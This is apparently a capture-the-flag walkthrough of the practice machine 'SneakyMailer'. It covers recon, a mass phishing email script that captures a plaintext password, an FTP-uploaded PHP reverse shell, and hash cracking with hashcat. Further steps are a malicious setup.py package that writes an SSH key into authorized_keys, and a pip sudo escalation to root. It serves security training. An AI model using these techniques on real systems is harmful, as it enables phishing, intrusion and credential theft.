# SneakyMailer

export IP=10.10.10.197

## Solution


Lets start with an nmap scan ... <br>

cmd: nmap -sC -sV -oN nmap/initial $IP

```
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: STARTTLS THREAD=REFERENCES CHILDREN ACL IDLE UIDPLUS CAPABILITY NAMESPACE UTF8=ACCEPTA0001 OK SORT ENABLE ACL2=UNION completed IMAP4rev1 QUOTA THREAD=ORDEREDSUBJECT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES CHILDREN ACL IDLE AUTH=PLAIN UIDPLUS CAPABILITY NAMESPACE UTF8=ACCEPTA0001 OK SORT ENABLE QUOTA completed IMAP4rev1 ACL2=UNION THREAD=ORDEREDSUBJECT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
```

that's ALOT!!! <br>

lets start with the ftp and anon login... Not allowed <br>

lets check 80 and 8080 <br>

Since server is not found, lets add "sneakycorp.htb" to /etc/hosts <br>

```
10.10.10.197 sneakycorp.htb
```

we start with a session already set and not possible to logout from the account !! <br>

from the page source code 

```
<!-- need to add Register link to Sidebar for /pypi/register.php -->
```

Accessing that page, we have a register form... from burp we got the headers

```
POST /pypi/register.php HTTP/1.1
Host: sneakycorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: http://sneakycorp.htb
Connection: close
Referer: http://sneakycorp.htb/pypi/register.php
Upgrade-Insecure-Requests: 1

firstName=w&lastName=w&email=w%40w.c&password=w&rpassword=w
```

The response is the same page with code 200 (nothing interesting at first sight) <br>

It is using server: nginx/1.14.2 <br>
Did not found any cve for that version <br>

The account has some messages

```
MESSAGE: Hey! My name is Bradley Greer, I am your personal code tester
FROM: Bradley Greer (bradleygreer@sneakymailer.htb)

########################################################

MESSAGE: Talk with Bradley, he is your personal tester
FROM: Cara Stevens (carastevens@sneakymailer.htb)

########################################################

MESSAGE: Excellent job with those modules,hope you keep working this way
FROM: Cara Stevens

########################################################

MESSAGE: Hello! I am the owner of the company, you are going to report to me now on

FROM: Cara Stevens
```

From the messages, i suppose that we should send an email to bradley <br>

Lets get all the e-mails from the /team.php page <br>

```
curl "http://sneakycorp.htb/team.php" > mails

sed -r -n -e '/@sneakymailer.htb/p' mails > clean_mails
```

Now we need to send emails to those that we cleaned up from the /team.php page !! <br>

```
To: <mail_from_file>
From: waza@waza.com
Subject: Anything
Body: goto http://10.10.14.242  (i got this from an hint)
```

I used a bash script to send all the emails at once (i needed to specify the server because even with the /etc/hosts entry it was not recognizing it)

```
#!/bin/bash

me=waza@waza.com
for email in $(cat mails) 
do
    swaks -s smtp.sneakycorp.htb --to $email --from $me --header "Subject: Creds" --body "goto http://10.10.14.242" &

done
```

and got the response at port 80

```
Connection received on 10.10.10.197 35818
POST / HTTP/1.1
Host: 10.10.14.242
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

after decode
```
firstName: Paul
lastName: Byrd
email: paulbyrd@sneakymailer.htb
password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

Use a mail client to see the emails !!! i'll use thunderbird <br>

And yeah, there is two emails there (sent folder!) <br>

```
EMAIL 1
#########################
TO: low@debian

MESSAGE: Hello low


Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience.
```

```
EMAIL 2
#########################
TO: root@debian

MESSAGE: Hello administrator, I want to change this password for the developer account
 
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
Please notify me when you do it
```

Tried it as another email account, but no luck... tried it in FTP and worked !! <br>

There is a folder called dev, i'll access with filezilla and get all the folder <br>

```
drwxrwxr-x    8 0        1001         4096 Oct 22 03:44 dev
```

Nothing interesting surprisingly.... <br>
But, all the website contents are accessible through the ftp, so there is a chance that the ftp service is running on the webserver folder which means that if we upload a shell we can access that at the browser!!! <br>

I tried with a simple txt file and it worked, lets upload a php-reverse-shell !!!! <br>

The developer user (in the FTP), just have permissions to upload to the dev folder
```
whoami
www-data
```

Now we need to escalate to the low user to get the first flag <br>

After linpeas run 

```
sudo version 1.8.27  (exploit exists, requires password)

lrwxrwxrwx 1 low  low        7 May 16 03:33 /home/low/venv/bin/python -> python3 (interesting)

Writable: /var/log/nginx/access.log.12.gz
Writable: /var/log/nginx/error.log.4.gz
Writable: /var/log/nginx/access.log

-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                                                                                                  
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 low low 3526 May 14 05:46 /home/low/.bashrc
-rw-r--r-- 1 low low 807 May 14 05:46 /home/low/.profile
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 43 May 15 14:29 /var/www/pypi.sneakycorp.htb/.htpasswd

/var/lib/nginx/body
/var/lib/nginx/fastcgi
/var/lib/nginx/proxy
/var/lib/nginx/scgi
/var/lib/nginx/uwsgi
/var/lib/php/sessions
/var/log/nginx/access.log
/var/log/nginx/access.log.1
/var/log/nginx/access.log.10.gz
/var/log/nginx/access.log.11.gz
/var/log/nginx/access.log.12.gz

/home/low/venv/ (grep for passwords)
/etc/debconf.conf (grep for passwords)

pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

Since i did not found anything worth it i went ahead and searched for more things on the /var/www and found another subdomain laying there

```
pypi.sneakycorp.htb
```

It requests some credentials which we might have found, lets id it

```
hashid 
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/

[+] MD5(APR) 
[+] Apache MD5 

```

we can now use hashcat for this
```
hashcat --help | grep apr1

mode 1600

cmd: hashcat -a 0 -m 1600 pwd /usr/share/wordlists/rockyou.txt -O

pwd: soufianeelhaoui
```

We can access pypi.sneakycorp.htb/packages but nothing there <br>

From a write-up (cause i did not knew) we need to create a python package with the following structure (src:https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/)

```
package_name/
    pacakage_name/
        __init__.py
    setup.py
    setup.cfg
    README.md
```

Then we need to build the package to generate a .tar.gz file and activate the venv

```
python3 setup.py sdist
```

Now we need to upload it to the pypi server (src:https://pypi.org/project/pypiserver/#upload-with-setuptools) <br>

first create a .pypirc at home (need to change HOME env variable because the other path the developer user has no permissions) <br>

cmd: export HOME=/tmp/w_sh

```
[distutils]
index-servers =
  pypi
  w_sh

[pypi]
username:w
password:w

[w_sh]
repository: http://127.0.0.1:5000
username: pypi
password: soufianeelhaoui
```

The low user has a file called <b> autorized_keys</b> in his home folder under the .ssh folder ! <br>

Since the python symlink in the venv will run as the low user, during the setup.py process it can do whatever (not with the OS lib) so we can inject a ssh key in that file and login to the low user!! <br>


```
SSH pub KEY:

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIm9fgDmB6NDStzhqEP55+CsbOSPZ4OTDB3k0o9Hg4gxr7FwNjVZKcu4VZAXz8jjA8xJJI5PahfJ0AoihCEiLGCUWEEOD5R48FlumI89c2KMfSkzdhOtCCub3Mdp8kq9PGnf2kse4Zm9eYnHoWVOoaC4FgOpoeZ8sAXoeoRyG1FV1zhAnqANPgWPamqn8WyfB+CjqoESEo56zvfJGAz6PB6jANZGj66P0og/5nny6yYXVj0B3f7/8hOYfFqaLpEBveAnxHGEUy6t1B65+Hc5cflZKn+pC6I63wJ+qqYRzwJPsnq3mpM8NHcyrcc6dzlH1LZB9RKFScBKR+81+i51sesp+ljpAmOKhGPo/6P7B4CLwA3gfKh8tg4VGdLa26beY+wx2EwgJmvPJ6HlwereAaUu+qfH1Z7YhemcxKSZKsoiOjckdgk9w9UrTiYQBSsuOr6fI0oZMSogiAHzbg9JmVGLFnD5ZbBCfStvcU4+7iOTNsiUvGZknPXYl9B8v+rFs=
```


new setup.py (with the public key in there)

```
from setuptools import setup

try:
    with open('/home/low/.ssh/authorized_keys', 'w+') as file:
        file.writelines('\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIm9fgDmB6NDStzhqEP55+CsbOSPZ4OTDB3k0o9Hg4gxr7FwNjVZKcu4VZAXz8jjA8xJJI5PahfJ0AoihCEiLGCUWEEOD5R48FlumI89c2KMfSkzdhOtCCub3Mdp8kq9PGnf2kse4Zm9eYnHoWVOoaC4FgOpoeZ8sAXoeoRyG1FV1zhAnqANPgWPamqn8WyfB+CjqoESEo56zvfJGAz6PB6jANZGj66P0og/5nny6yYXVj0B3f7/8hOYfFqaLpEBveAnxHGEUy6t1B65+Hc5cflZKn+pC6I63wJ+qqYRzwJPsnq3mpM8NHcyrcc6dzlH1LZB9RKFScBKR+81+i51sesp+ljpAmOKhGPo/6P7B4CLwA3gfKh8tg4VGdLa26beY+wx2EwgJmvPJ6HlwereAaUu+qfH1Z7YhemcxKSZKsoiOjckdgk9w9UrTiYQBSsuOr6fI0oZMSogiAHzbg9JmVGLFnD5ZbBCfStvcU4+7iOTNsiUvGZknPXYl9B8v+rFs=')
except:
    setup(name='w_sh',packages=['w_sh'],description='waza',version='0.1',url='http://github.com/something/w_shell',author='waza',author_email='w@w.c',keywords=['pip','w_sh','www']) 
```

then we run the upload to the pypi server
```
python setup.py sdist upload -r w_sh

chmod 600 ssh_key
ssh -i ssh_key low@$IP

whomai
low

cat user.txt
FLAG: c12fb87e1f0f15a6b127f42939f4f01b
```

now lets pursuit the root account !!! <br>

By doing sudo -l on the low account we have

```
Matching Defaults entries for low on sneakymailer:                                                                                                                                   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                 

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3   
```

great, on gtfo bins there is a privesc for pip

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo /usr/bin/pip3 install $TF
```

and voila
```
whoami 
root

cat /root/root.txt
FLAG: 12a51b141d1555c63ab6b2f13edaeee8

```